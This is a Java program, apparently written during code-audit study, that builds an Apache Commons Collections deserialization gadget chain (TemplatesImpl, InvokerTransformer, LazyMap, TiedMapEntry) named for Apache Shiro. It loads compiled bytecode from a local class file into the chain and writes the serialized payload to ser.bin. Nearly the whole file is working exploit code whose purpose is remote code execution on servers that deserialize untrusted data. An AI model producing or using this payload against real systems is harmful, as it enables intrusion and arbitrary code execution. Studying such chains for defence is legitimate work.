import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class ShiroCC {
    public static void main(String[] args) throws Exception {
        //cc3
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        Field bytecodeField = tc.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\17140\\Desktop\\暑假实习\\java代码审计\\Cc1_test\\target\\classes\\Test.class"));
        byte [][] codes= {code};
        bytecodeField.set(templates,codes);
        //cc2
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        //cc6
        HashMap<Object ,Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry= new TiedMapEntry(lazyMap,templates);

        HashMap<Object,Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry,"bbb");
        lazyMap.remove(templates);

        Class c = LazyMap.class;
        Field factoryField =c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,invokerTransformer);
        serialize(map2);

        //unserialize("ser.bin");

    }
    public  static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        /*
        写对象，序列化
         */
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        /*
        读对象，反序列化
         */
        return obj;
    }
}
